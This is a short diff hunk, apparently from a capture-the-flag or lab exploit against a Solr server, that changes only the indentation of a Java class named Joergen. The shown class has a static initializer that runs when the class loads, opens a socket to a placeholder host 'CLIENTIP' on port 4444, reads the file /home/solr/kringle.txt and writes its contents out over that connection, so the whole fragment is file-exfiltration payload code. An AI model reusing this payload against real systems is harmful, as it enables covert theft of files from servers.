@@ -61,8 +61,8 @@ import java.net.Socket;
 public class Joergen {
   static {
     try {
-	  Socket socket=new Socket("CLIENTIP",4444);
-	  PrintStream out = new PrintStream( socket.getOutputStream() );
+      Socket socket=new Socket("CLIENTIP",4444);
+      PrintStream out = new PrintStream( socket.getOutputStream() );
       Path path=Paths.get("/home/solr/kringle.txt");
       byte[] data = Files.readAllBytes(path);
       out.write(data);
